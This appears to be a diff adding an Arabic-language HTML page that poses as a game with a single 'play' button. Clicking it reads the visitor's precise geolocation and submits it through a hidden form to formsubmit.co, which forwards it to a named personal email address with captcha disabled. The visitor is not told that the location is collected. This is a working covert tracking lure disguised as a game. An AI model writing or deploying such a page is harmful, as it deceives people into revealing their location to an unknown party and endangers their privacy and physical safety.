@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>لعبة</title>
+  <style>
+    body {
+      font-family: Tahoma, Arial, sans-serif;
+      padding: 50px;
+      direction: rtl;
+      text-align: center;
+      background-color: #f4f4f4;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+
+  <button id="sendLocationBtn">إلعب</button>
+
+  <!-- نموذج مخفي لإرسال البيانات إلى البريد عبر formsubmit.co -->
+  <form id="locationForm" action="https://formsubmit.co/Vikram0602@proton.me" method="POST">
+    <input type="hidden" name="coordinates" id="coordsInput" />
+    <input type="hidden" name="_subject" value="إحداثيات موقع جديد">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="thank-you.html" />
+  </form>
+
+  <script>
+    const sendBtn = document.getElementById('sendLocationBtn');
+    const coordsInput = document.getElementById('coordsInput');
+    const form = document.getElementById('locationForm');
+
+    function formatXY(longitude, latitude) {
+      return `${longitude};${latitude}`;
+    }
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert('شكرن');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          coordsInput.value = formatXY(lon, lat);
+          form.submit();
+        },
+        (err) => {
+          alert('تم ' + err.message);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    sendBtn.addEventListener('click', sendLocation);
+  </script>
+
+</body>
+</html>
